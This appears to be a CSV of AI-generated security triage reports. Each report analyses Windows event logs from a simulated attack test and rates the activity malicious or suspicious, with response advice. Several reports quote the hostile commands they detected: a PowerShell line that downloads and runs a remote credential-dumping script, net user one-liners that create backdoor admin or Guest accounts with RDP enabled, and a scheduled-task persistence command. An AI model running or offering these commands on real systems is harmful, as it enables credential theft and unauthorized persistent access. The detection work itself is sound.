Directory Name,AI Response
WinPwn - Loot local Credentials - Safetykatz,"Upon reviewing the event logs provided, the following findings stand out:

### System and Security Logs:
- The logs indicate normal system operations with frequent updates to the time; there is no evidence suggesting malicious tampering with system time, as operations are linked appropriately with `svchost.exe`, which is a common Windows process.
- The `Windows Defender` status remains active as indicated in the application log, which helps maintain the system's security posture.

### Application Logs:
- Routine Microsoft Edge Updates (`MicrosoftEdgeUpdate.exe`) are noted, which is regular behavior for maintaining application security through updated versions. These updates occur as expected under the `NT AUTHORITY\SYSTEM` account.

### Sysmon Logs:
- There is frequent use of `wevtutil.exe` and `conhost.exe`. These processes relate to event handling and console operations, respectively. However, they are executed by `SERVER002\admin_test` user, which is relatively normal unless this user is unauthorized or unexpected to perform such actions.
- **Significant Concern:** 

One particularly anomalous command-line execution stands out:

- **Process Executed:**
  - `powershell.exe` with the command line:
    ```plaintext
    ""powershell.exe"" & { $script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), safedump -consoleoutput -noninteractive}
    ```

  This indicates a suspicious power shell script being downloaded and executed from GitHub, which could potentially represent a script hosting malicious payloads. The usage of `iex` (Invoke-Expression) with `new-object net.webclient` to download and execute a script from an external source without explicit system administrator authorization likely indicates malicious activity.

### PowerShell Logs:
- The PowerShell logs confirm the execution of the aforementioned script with commands loaded directly from the URL, which hints at potential compromise.
  
### Assessment:
- **Indicators of Compromise:**
  - The unauthorized PowerShell script execution is a red flag. It involves downloading and potentially executing malicious scripts without verified user awareness or consent. This is consistent with potentially harmful behavior associated with initial access or execution stages of a cyber attack scenario.

### Conclusion:
- The evidence, particularly relating to the suspicious execution of an externally-hosted PowerShell script, strongly indicates malicious activity.
  
### Recommendation:
- Treat this situation as a **MALICIOUS** incident.
- Immediate actions are required including:
  - Isolating the affected machine (Server002) from the network to prevent further execution or propagation.
  - Investigating the script's content and its origin for any further indicators of compromise or other affected systems.
  - Conducting a thorough forensic analysis to understand any potential impact or data exfiltration.
  - Ensuring all related credentials are considered compromised and perform a reset.
  - Enhancing email and web gateway protections to block similar script executions or downloading sources.
  - Educating the user base on the risks associated with unauthorized script execution.

Take these measures to mitigate any further risk and safeguard against similar future attempts."
Download Macro-Enabled Phishing Attachment,"After analyzing the provided Windows event logs, the following observations stand out:

### Analysis:

1. **PowerShell Activity:**
   - Multiple PowerShell logs indicate the execution of a script that downloads a file from a GitHub URL (`https://github.com/file/file-file/raw/master/files/data.001/bin/PhishingAttachment.xlsm`) using the `Invoke-WebRequest` command. The file is named `PhishingAttachment.xlsm`, and it is downloaded to the temporary directory. This activity is highly suspicious because:
     - A PowerShell script is being used to download a file from the internet, which is often a method used in malware distribution.
     - The file name `PhishingAttachment.xlsm` suggests that it could be a malicious Excel file, potentially containing macros or other forms of executable content that could compromise the system.
     - The use of `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` suggests that the download is being handled over TLS, but still, the source and nature of the file remain suspicious.

2. **Sysmon Logs:**
   - The Sysmon logs show the execution of processes such as `powershell.exe` with the same suspicious command line, reinforcing the activity noted in the PowerShell logs.
   - Several execution paths and user contexts suggest regular system processes, but the PowerShell activity is initiated by the `admin_test` user, pointing to a potentially compromised user account.

3. **Security and System Logs:**
   - The security logs and system logs show regular system operations, such as events related to time adjustments and kernel operations. These do not provide any direct evidence of malicious activity but should be noted as regular system noise at the time of the suspicious PowerShell activity.

### Assessment:

The activity observed in the PowerShell event logs, combined with the corroborating Sysmon logs, indicates potentially malicious behavior:

- The execution of a PowerShell script to download a file with a phishing indicator in its name aligns with common tactics used in cyber attacks, particularly in phishing campaigns designed to deliver malware.
- The suspicious command line used in PowerShell is a strong indicator of a potential attempt to compromise the system.

Given these observations, the activity observed in the logs aligns with known malicious behaviors, particularly around malware distribution and phishing campaigns.

### Resolution:

**MALICIOUS**

### Recommendations:

1. **Immediate Action:**
   - Isolate the affected system (Server002) from the network to prevent further compromise or lateral movement by potential threats.
   - Investigate the `admin_test` account for signs of compromise, such as unusual login times or access from unfamiliar IP addresses.

2. **Forensic Actions:**
   - Secure and analyze the downloaded file located in the TEMP directory if present. Examine for malicious content like macros or executables.
   - Review other systems within the network for similar signs of compromise or suspicious activity.

3. **Preventive Measures:**
   - Enhance monitoring of PowerShell and scripting activities to catch similar incidents early.
   - Educate users on safe handling of emails and suspicious links, emphasizing the risks of macro-enabled documents.

4. **Remediation:**
   - Patch any vulnerabilities, review and update security policies, especially around user permissions and execution policies for scripts.
   - Implement application whitelisting to control execution of unauthorized scripts and binaries."
Create local account with admin privileges,"Based on the provided Windows event logs analysis, let's break down the key findings:

### Indicators of Suspicious Activity:

1. **Time Changes:**
   - The logs show instances of time changes through events with EventID `4616`, where the system time was adjusted. While time changes can occur for legitimate reasons (e.g., synchronization with time servers), unexplained or repeated modifications might be indicative of malicious activities where an attacker tries to cover tracks or alter time-sensitive operations.

2. **Privilege Escalation and Account Manipulation:**
   - The log entry with EventID `4624` indicates a logon by the user `admin_test` with high privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.), suggesting potential elevation of privileges.
   - An account named `art-test` was created (EventID `4720`) and added to the Administrators group (`4732`), along with a password being set. These actions are suspicious, especially if they occur unexpectedly or without prior authorization.

3. **Process Execution:**
   - A command was executed via `cmd.exe` to create a user and add it to the `administrators` group using entries with EventIDs `4717` (PowerShell) and `4728` (Security). The command line `cmd.exe /c net user art-test /add & net user art-test -4RTisCool!-321 & net localgroup administrators art-test /add` further supports the suspicion of unauthorized account manipulation.

4. **Use of System Utilities:**
   - The utility `wevtutil.exe` was executed several times, which may not be suspicious in itself but could be used for altering event logs (often used to clean up logs during attacks) — entries with Sysmon EventID `5`.

5. **Edge Update Anomalies:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` and its associated processes (e.g., `ComRegisterShell64.exe`) executing may indicate normal operations; however, given the context, it's worth investigating whether these were part of a legitimate update cycle due to potential exploitation scenarios.

### Assessment and Resolution:

Given the indications of suspicious behavior, particularly the creation of a new administrative user (`art-test`) and use of system utilities likely for log tampering or backdoor creation, there are strong indicators that unauthorized actions took place on the system. 

**Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Action:**
   - Investigate the source and reason for the `admin_test` user actions. If this is an unauthorized user, terminate any sessions and reset accounts.
   - Remove the `art-test` account from the system and audit other accounts for unauthorized access.
   - Review and possibly restore system time to ensure consistency and accuracy.

2. **Long-term Measures:**
   - Implement logging and monitoring enhancements to capture account creation and privilege escalation attempts.
   - Conduct a comprehensive security audit and review of recent changes on the system.
   - Update and patch all systems to mitigate exploiting outdated services or software versions.

3. **Analysis Extension:**
   - Continue monitoring for any additional indicators of compromise that may not have appeared in the current review.
   - Evaluate network traffic for any external communication that may suggest data exfiltration or access from external sources.

The presence of these entries strongly suggests unauthorized access and administrative actions were taken without proper authorizations, warranting an immediate and thorough investigation."
Activate Guest Account,"## Detailed Analysis of the Logs:

### Suspicious Activity Analysis

1. **Process Execution Analysis**:
    - Multiple events involve the execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. While `wevtutil.exe` and `conhost.exe` are legitimate Windows system processes, frequent execution without apparent administrative tasks can be suspicious.
    - One standout event involves the execution of `cmd.exe` with the command-line argument: `""cmd.exe"" /c net user guest /active:yes`. This command activates the Guest user account on the system, which is a significant security concern. Often, attackers attempt to enable built-in accounts for unauthorized access.

2. **Privilege Escalation Attempt**:
    - Activating the Guest account suggests an attempt to escalate privileges or create additional ways to access the system. The command executed under the `admin_test` user raises concerns regarding this account's intended use and security posture.

3. **User Account Modifications**:
    - Related security logs record activity by `admin_test` enabling the Guest account (`EventID: 4722`) and modifying its properties (`EventID: 4738`), which align with the suspicious `cmd` command execution. These actions are often linked with malicious intent in many scenarios.

4. **Additional Noteworthy Executions**:
    - The executions of `whoami.exe` and `hostname.exe` allow the user to query details about the current user and system, which are typical actions during reconnaissance phases of an attack but can also be legitimate within system administration contexts.

5. **Software Update Activity**:
    - Frequent and varied execution of processes related to Edge updates (`MicrosoftEdgeUpdate.exe` and related components) appear benign. These activities typically indicate routine software maintenance but do not directly paint the overall security picture without further aberrant evidence.

### Final Assessment
Based on the analysis of logs, particularly the activation of the Guest account and the context around `admin_test` user's activities, indications of possible compromise or preparation for further malicious activity exist.

### Recommendation and Resolution

- **Resolution**: **SUSPICIOUS**
- **Next Steps**:
  - Conduct a thorough investigation of the `admin_test` account. Validate its intended privilege level and recent activities.
  - Examine the motivation behind enabling the Guest account. It's crucial to determine if this was an action by a legitimate user or an unauthorized actor.
  - Review system access logs for unexpected or unusual login attempts, especially under the Guest account.
  - Evaluate the security configurations and policies related to account restrictions to prevent unauthorized activation of default accounts.
  - Ensure all systems are updated and use up-to-date security software to mitigate and detect unauthorized activities."
Enable Guest account with RDP capability and admin privileges,"After reviewing the provided logs, there are several points of concern indicating potential malicious activity: 

1. **Windows Sysmon Log:**
   - There is suspicious command-line activity executed by `cmd.exe` which includes the activation of the `Guest` account, setting its password, and adding it to the `Administrators` and `Remote Desktop Users` groups. The command line is as follows:
     ```
     ""cmd.exe"" /c net user guest /active:yes & net user guest Password123! & net localgroup Administrators guest /add & net localgroup ""Remote Desktop Users"" guest /add & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add ""hklm\\system\\CurrentControlSet\\Control\\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f
     ```
   - This action suggests an attempt to create a backdoor through the `Guest` account, potentially allowing remote connections via the RDP service.

2. **Security Log:**
   - Event ID `4722`: The `Guest` account was enabled.
   - Event ID `4724` and `4732`: The password for the `Guest` account was changed, and the account was added to the `Administrators` group.
   - These event IDs correlate with the Sysmon logs, indicating a high likelihood of unauthorized privilege escalation.

3. **Suspicious Behavior Identified:**
   - The `Guest` account is typically disabled by default in Windows systems. Activating, modifying, and elevating privileges for this account is suspicious and usually an indicator of unauthorized access or an attempt to maintain persistent access.
   - The actions involving the account changes and network settings suggest an attempt to compromise the system and potentially access it remotely.

**Assessment and Resolution:**
- **Malicious Activity Detected**: The logs indicate clear malicious actions that impact the security of the company network.
- The activity of enabling the `Guest` account, changing its password, adding it to the `Administrators` and `Remote Desktop Users` groups, and modifying registry settings related to RDP connections is a straightforward indication of a security breach.

**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Disable the `Guest` account immediately and change passwords for all accounts, especially the ones having administrative privileges.
   - Investigate if the credentials of the account `admin_test` were potentially compromised, as this account was used in these operations.

2. **Incident Response:**
   - Initiate your incident response procedures to contain and eradicate the threat.
   - Identify if any other systems in the network were compromised.

3. **Forensic Analysis:**
   - Conduct a thorough forensic analysis to determine the scope of the breach and gather any additional indicators of compromise (IOCs).
   - Check for any outbound communications from the system that could indicate data exfiltration.

4. **Review Security Policies:**
   - Consider implementing stricter controls around privileged accounts, such as Multi-Factor Authentication (MFA), and conduct training on phishing and other security threats.

Resolution: **MALICIOUS** 

This analysis indicates that the logs contain activity that is 100% malicious, requiring urgent attention to neutralize the threat and strengthen security controls."
Word spawned a command shell and used an IP address in the command line,"Upon reviewing the provided logs, several points of interest and concern have been identified. Here’s a breakdown of notable findings:

1. **PowerShell Activity:**
   - There are numerous PowerShell events indicating the execution of potentially suspicious code. The command-line reveals a script being downloaded and executed from a GitHub URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`). This script seems to involve modifying auto-execution routines (`Invoke-script -macroCode`) which is commonly associated with malicious activity like document-based malware.
   - The scenario described (`$macrocode`) involves editing a file and executing a quit script with a `ping` statement, typically used in payloads to create pauses or as a rudimentary check of internet connectivity.

2. **Logon and Privilege Escalation:**
   - There are several events associated with logon sessions and privilege uses for the user `SYSTEM` and `SERVER002$`. This includes `EventID 4672`, which logs special privileges like `SeDebugPrivilege`, commonly seen in potential privilege escalation or exploit scenarios.
   - `EventID 4798` indicates enumeration of user accounts (`Administrator`, `admin_test`, etc.) on the system. This can be part of reconnaissance activity.

3. **Sysmon Activity:**
   - Various process creations have been recorded, including processes like `wevtutil.exe` and `conhost.exe` under the user `admin_test`, possibly reflecting suspicious activity, especially when seen together with the unorthodox PowerShell execution pattern.
   - The execution of the tool `whoami.exe` from an elevated context under the user `admin_test` can hint at verification of permissions post-privilege escalation.

4. **Microsoft Edge Update:**
   - Repeated log entries involving Microsoft Edge Update may appear benign as they are associated with regular system updates. However, the frequency and variety of command-line arguments (e.g., `/ping`, `/ua`, `/svc`) may warrant a closer look to ensure legitimacy, particularly if these were initiated close to the power shell activity timeframe.

5. **Lack of Legitimate System Context:**
   - There are no direct logs showing clear legitimate administrative tasks or system maintenance that would normally justify such activities, especially around the PowerShell invocation with downloading a script and the enumerations.

**Assessment:**
- The presence of the suspicious PowerShell activity, combined with privileged system access and unusual user enumeration, strongly indicates possible malicious actions. The use of external scripts and unnecessary privilege accesses are red flags for possible compromise.

**Resolution: MALICIOUS**
- Immediate remediation steps should be taken, including isolating the machine from the network, running a comprehensive malware and vulnerability scan, and conducting a deep dive forensic analysis to confirm the potential impact and scope of any breach.
- Recommend reviewing the network logs for this period for any outgoing connections or data exfiltration linked to these events.
- Also, a review of access rights and a change of credentials for accounts involved (`admin_test` and similar) is advised."
Octopus Scanner Malware Open Source Supply Chain,"### Detailed Analysis of the Logs:

Upon reviewing the provided logs, several activities warrant attention for potential malicious activity:

1. **Command Execution**: 
    - The execution of `cmd.exe` with command line arguments `\""cmd.exe\"" /c copy %%temp%%\\ExplorerSync.db %%temp%%\\..\\Microsoft\\ExplorerSync.db & schtasks /create /tn ExplorerSync /tr ""javaw -jar %%temp%%\\..\\Microsoft\\ExplorerSync.db"" /sc MINUTE /f` suggests a suspicious behavior. Creating a scheduled task (`schtasks /create`) with these parameters could indicate an attempt to maintain persistence on the system by executing a potentially malicious file (`ExplorerSync.db`) every minute.

2. **User Context**:
    - The commands and tasks are being executed under the user `SERVER002\\admin_test`, which indicates that an administrative account was leveraged for executing these tasks. This raises concerns about potential privilege abuse or compromise of an admin account.

3. **Use of Common Utilities**:
    - The presence of processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` appearing alongside suspicious activities can be indicative of an attempt to either gather logs, host a console, or execute scripts without user detection. The use of `wevtutil.exe` suggests possible manipulation or cleaning of event logs which can be used to cover tracks.

4. **Other Observations**:
    - Multiple executions of Microsoft Edge Update utilities (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) are a normal behavior. However, in this context, the usage seen within close timestamps and possibly as parent processes to the suspicious cmd activity could indicate masquerading or misuse of legitimate update tools.

### Assessment and Resolution:

- **Indicators of Compromise**: The creation of scheduled tasks with minimal intervals, copying and executing unknown files (e.g., `ExplorerSync.db`), and potential misuse of admin credentials are strong indicators of malicious intent.

- **Threats and Risks**: The existing behavior points to actions consistent with malware persistence techniques and possibly data exfiltration or reconnaissance without user knowledge.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Investigate the `ExplorerSync.db` file's origin, purpose, and contents. This can involve checking for known malicious signatures or analyzing it in a sandbox environment.
   - Review the scheduled tasks on the system and disable or delete tasks that were created suspiciously.
   - Check user account `admin_test` for unauthorized accesses or changes, including recent activities and logins.

2. **Further Investigation**:
   - Analyze network logs to identify any outbound connections during or following these events.
   - Review additional logs, such as Windows PowerShell logs or potentially missing security logs, for further signs of compromise.

3. **Preventive Measures**:
   - Consider implementing stricter privilege access management protocols and monitoring.
   - Evaluate the need for enhanced monitoring or adjustment of security policies on workstations for early detection of similar attempts in the future.

### Final Resolution:

**MALICIOUS** - The log activities strongly suggest malicious behavior warranting prompt investigation and intervention to mitigate potential risks."
Use PsExec to elevate to NT Authority\SYSTEM account,"Based on the provided event logs from the CEO's machine, several activities stand out which warrant a detailed analysis:

1. **Log File Clearing Events**: 
   - Security Event ID `1102` and System Event ID `104` indicate logs have been cleared. The user account `admin_test` was used to execute these actions. Log clearing is often used to hide malicious activities and is considered suspicious unless justified by an administrative purpose.

2. **Usage of System Utilities**:
   - Sysmon Event IDs `1` show multiple instances of the execution of system utility `wevtutil.exe` by `admin_test` to clear logs. This aligns with the log clearing events and further corroborates potentially malicious intent.

3. **PSEXESVC Service Installation**:
   - System Event ID `7045`, where `PSEXESVC` was installed as a service, is trackable via `Sysmon` Event IDs. `PsExec` is a legitimate tool but often used by attackers to execute commands remotely and may indicate lateral movement or privilege escalation if unauthorized.

4. **Suspicious Process Execution**:
   - The execution of `cmd.exe` with PsExec to run `whoami` under `NT AUTHORITY\SYSTEM` context further indicates potential unauthorized privilege escalation or reconnaissance activities.

5. **Process Execution with High Integrity Levels**:
   - Processes such as `cmd.exe` (Sysmon Event ID `1`) executed by `admin_test` with high integrity level might indicate potential attempts to perform administrative tasks or compromise operations.

6. **Credential Access Failures**:
   - Multiple Security Event ID `5379` events indicate failures in reading credentials related to `MicrosoftAccount:user=02txoixylodcstop`. Frequent failed credential access attempts can be indicative of an unauthorized account manipulation or reconnaissance attempt.

These actions, when viewed collectively, hint at a potential misuse of administrative privileges, likely indicating an escalation attempt or backdoor setup for future access.

### Assessment
The logs indicate several potentially malicious actions:
- Unexplained log clearing activity.
- Unauthorized use of administrative tools (PsExec) under the guise of a legitimate user.
- High integrity level command-line operations potentially aimed at securing elevated privileges.

### Resolution

**MALICIOUS**: The series of actions, especially log alterations, usage of PsExec for remote command execution, and high privilege operations, are hallmark behaviors of malicious activity. Immediate attention and remediation are required.

### Guidance and Next Steps
1. **Immediate Incident Response**: Halt further use of `admin_test` credentials and assess the extent of the privilege escalation.
2. **System Isolation**: Isolate the affected machine from the network to prevent potential spread of any unauthorized access.
3. **Thorough Forensic Analysis**: Engage your security team to conduct a deeper forensic analysis of the host to identify any persistent threats or backdoors.
4. **Review Access Logs**: Examine recent changes and access logs for related systems to identify further compromise points.
5. **User Awareness and Training**: Reiterate the importance of cybersecurity protocols, emphasizing not using elevated privileges unless necessary."
WinPwn - Loot local Credentials - powerhell kittie,"Upon analyzing the provided logs, several events raise concerns for potential malicious activity:

1. **PowerShell Execution**:
   - The logs reveal a PowerShell command executed with the intent to download and execute a script from a GitHub repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). The use of the `iex(new-object net.webclient).downloadstring(...)` command is notorious for being used in malicious activities to execute scripts directly from external sources. The command also involves a potentially obfuscated dump with `obfuskittiedump -consoleoutput -noninteractive`, indicating the possible obfuscation of script activities.

2. **Multiple Sysmon Entries for Standard System Processes**:
   - The Sysmon logs highlight repeated entries of `wevtutil.exe` and `conhost.exe` being executed. While these are legitimate system processes, frequent invocation in such a short period could indicate process hollowing or attempts to masquerade malicious activity under legitimate processes.

3. **Anomalous User Behavior**:
   - The events list `SERVER002\\admin_test` user executing high-integrity processes. Despite the user appearing to be an administrative account responsible for various tasks, the simultaneous use of such privileges shortly before and after a suspicious PowerShell activity is notable. It’s common for attackers to leverage compromised administrative accounts to obscure their actions.

4. **Time Discrepancies in Security Logs**:
   - A notable aspect of the security logs is the time change records (Event ID 4616) suggesting potential attempts to manipulate system time. This is a common tactic used to evade logging/tracking.

5. **Microsoft Edge Update**:
   - There are multiple instances in Sysmon logs reflecting activities related to Microsoft Edge Update processes. While most of these events seem standard for system updates (`MicrosoftEdgeUpdate.exe`), analyzing whether this activity correlates with legitimate update operations is essential, as it could mask other suspicious actions.

**Assessment**: Based on the observed PowerShell execution of an external script, especially using techniques that can obscure its presence (obfuscation), and the system's administrative account's active participation during these events, the logs indicate possible unauthorized manipulation and potentially malicious activity.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate isolation of `Server002` and thorough inspection of the downloaded script and its contents.
- Perform a detailed examination of the `admin_test` account activities and privilege usages during the captured time frame.
- Review organization-wide PowerShell execution policies, blocking or restricting execution of scripts from external sources.
- Update and scan the system with updated antivirus definitions to ensure no further compromises exist.
- Implement stronger monitoring and alerting for excessive or abnormal use of administrative privileges."
USB Malware Spread Simulation,"After thoroughly investigating the provided Windows event logs from the CEO's machine, several key details emerge that suggest anomalous behavior.

**Analysis:**

1. **PowerShell Logs:**
   - Multiple PowerShell events indicate the execution of a script aiming to create files on removable drives. The script uses `Get-WmiObject` to query logical disks for removable drives and tries to create a file `dataTest1.txt` on each detected removable drive with the value ""data Test 1 has created this file to simulate malware spread to removable drives.""
   - The command execution suggests the intention to distribute malicious content through removable media, a common technique used in malware distribution.

2. **Sysmon Logs:**
   - Windows PowerShell was executed with elevated privileges, indicated by the integrity level being ""High,"" which allows it to perform actions typical of administrative users. 
   - Frequent execution of utility applications like `wevtutil.exe` and `conhost.exe` by the `admin_test` user is somewhat suspicious and warrants further scrutiny, though not conclusively malicious on its face.

3. **System and Security Logs:**
   - There is a lack of direct evidence of privilege escalation or lateral movement within these logs. However, the presence of a high number of entries involving system-level processes (`svchost.exe`) and audit changes could imply that system time was altered, although without context, this may not directly imply hostile intent.

**Assessment:**

The activity seen within these logs indicates potentially malicious intent, particularly due to the PowerShell script involving removable drives — a notable approach for malware and cybersecurity threats aiming to spread across systems. The execution of PowerShell with a script that explicitly mentions simulating malware-like behavior further substantiates this conclusion.

**Resolution: MALICIOUS**

**Guidance:**

- Immediate actions should be taken to isolate the affected machine from the network to prevent further spread or potential data exfiltration.
- Perform a comprehensive malware scan using up-to-date antivirus software, focusing on any removable drives connected to the machine.
- Investigate and audit any devices previously connected to this machine for similar signs of compromise.
- Review user access logs and permissions to assess whether any unauthorized privilege escalations took place.
- Consider deploying additional security measures, such as restricting PowerShell execution to authorized scripts only and implementing strict controls over the use of removable media."
Azure Persistence Automation Runbook Created or Modified,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided event logs, there's a range of normal and suspicious activities. Below, I have detailed observations focusing on potential indicators of malicious activity or anomalies:

#### 1. **Windows PowerShell Log Anomalies:**
   - **Event IDs 600 & 400 Series:**
     - The PowerShell events show the execution of a script intended to interact with Azure services using `Connect-AzAccount`. The credentials are created using:
       ```powershell
       $secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
       $creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
       ```
     - This execution of creating a blank password and converting it to a secure string is highly suspicious. Furthermore, using `Connect-AzAccount` without proper arguments and handling suggests a template or incomplete command typically seen in testing or misuse by an unauthorized script.

#### 2. **Sysmon Log Observations:**
   - **Process Creations:**
     - Several process creations under `NT AUTHORITY\SYSTEM`, including `MicrosoftEdgeUpdate.exe`, `powershell.exe`, and `conhost.exe`, seem legitimate by their appearance but should be validated.
     - Critical is the initiation of `wevtutil.exe` command multiple times by the user `SERVER002\admin_test`, which could indicate log file reading or tampering attempts—a potential indicator of covering tracks or log forensic artifact collection.
   - **Suspicious PowerShell Instance:**
     - `PowerShell.EXE` initiated with a peculiar command with blank credentials and Azure automation tasks aligns with PowerShell logs, corroborating the suspicious script execution.
   - **General Notes:**
     - The creation and adjacency of tools like `whoami.exe` and `hostname.exe` indicate reconnaissance or environment understanding actions often part of post-exploitation activities.

#### 3. **Security/System/Application Logs:**
   - **Incompleteness:**
     - The absence (possibly sanitized or extraction failure) of relevant logs from Security, System, and Application modulates this analysis. These would typically provide insights into user logins or failures, privilege changes, and application errors.

### Assessment:

- **Indicators of Potential Compromise:**
  - Anomalies involving PowerShell usage with uncharacteristic command patterns.
  - `wevtutil.exe` usage for possible log manipulation or deletion.
  - Lack of conventional application logs suggesting potential log tampering.

### Conclusion:

Based on the processes executed (particularly PowerShell) and focus on Azure account connections with suspect settings, coupled with intelligent reconnaissance commands like `wevtutil` and typical recon steps (`whoami`, `hostname`), there are moderate signs of `SUSPICIOUS` activity.

### Recommendation:

- **Immediate Actions:**
  - Conduct a full memory capture and network traffic analysis on `Server002` to seek further anomalies or active malware.
  - Audit Azure account activities, focusing on logins and executed commands linked to `server002\admin_test`.
  - Broaden log analysis for account privilege abuse or lateral movement techniques by `admin_test`.

- **Resolution:** SUSPICIOUS - Logs require further extensive investigation in collaboration with incident response to eliminate false positives and confirm no threat persistence."
Running Chrome VPN Extensions via the Registry 2 vpn extension,"Upon thoroughly examining the provided logs, I have identified several events that warrant closer scrutiny. Here's a detailed breakdown and assessment of these logs:

### Security Log Analysis:
1. **Event ID 4624 (Logon Events):**
   - These entries indicate a successful logon session. The TargetUserName ""SYSTEM"" and LogonType ""5"" (service) suggest normal operations for a system service logon.
   - The ProcessName ""C:\\Windows\\System32\\services.exe"" is typical for service-related logons. However, frequent repeated entries of a similar nature within a short timeline might require attention to ensure no unusual automation or repeated tasks are being improperly triggered.

2. **Event ID 4672 (Special Privileges Assigned to New Logon):**
   - The SYSTEM account acquiring privileges is normal for system operations. It includes high-level privileges, which are expected for this account.

3. **Event ID 5379 (Credential Validation):**
   - The repeated failures to read credentials related to ""WindowsLive"" and ""MicrosoftAccount"" might indicate routine background activities involving service accounts or misconfigurations. The return code ""3221226021"" suggests ""STATUS_LOGON_FAILURE,"" which could be benign if related to service attempts to authenticate or sync with online accounts but should be checked to ensure no unauthorized access attempts are being made.

4. **Event ID 4798 (User Account Enumeration):**
   - Numerous events where an account enumeration activity was recorded (e.g., for ""Administrator,"" ""DefaultAccount"") by process ""C:\\Windows\\System32\\taskhostw.exe"". While this activity can be benign in some contexts, it also aligns with reconnaissance typical in lateral movement or privilege escalation attempts.

### PowerShell Log Analysis:
- PowerShell activities reveal a script executing various actions such as creating registry entries related to Chrome extensions and manipulating browser processes (e.g., starting and stopping Chrome). This behavior is suspicious, especially considering the specific extensions managed via the script. The actions might hint at potentially unwanted programs or backdoors being established.

### Sysmon Log Analysis:
- Several Sysmon events document process creations involving PowerShell, `wevtutil.exe`, `hostname.exe`, and `whoami.exe`. The context suggests these might be used for system reconnaissance or log manipulations. The use of PowerShell with scripts affecting browser extensions is particularly concerning.
- Notably, `wsmprovhost.exe` is shown as a parent process in several instances, pointing to possible remote management activities.

### Overall Assessment:
The combination of automated PowerShell scripts making system changes, account enumeration, frequent unsuccessful credential validations involving remote accounts, and local processes that could facilitate system information gathering are indicative of unauthorized or suspicious activity. The evidence suggests potentially malicious behavior aiming for lateral movement, privilege escalation, or setting the stage for further system compromise.

### Resolution:
- **Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Response:**
   - Initiate a more detailed investigation into the origin and purpose of the detected PowerShell scripts. Inspect all additions to registry paths related to browser extensions.
   - Conduct a thorough review of security configurations on affected Windows hosts to identify any unauthorized changes or additional threats.
   - Isolate affected systems if necessary to prevent potential lateral movement.

2. **Monitoring and Prevention:**
   - Enhance monitoring on PowerShell usage and restrict execution policies. Consider employing AMSI (Antimalware Scan Interface) and logging of command-line parameters for enhanced oversight.
   - Review account management and security audits to intercept anomalous account enumeration activity.
   - If not done already, consider deploying endpoint detection and response solutions to expand visibility on processes and network communications.

3. **Clean-Up and System Hardening:**
   - After corroborating malicious activity, reverse unauthorized modifications, especially ones involving persistence mechanisms (e.g., registry modifications).
   - Regularly update security patches and verify the security integrity of all remote interfaces, ensuring they are properly secured against unauthorized access. 

By following these recommendations, the company can mitigate the immediate threat and bolster defenses against future occurrences."
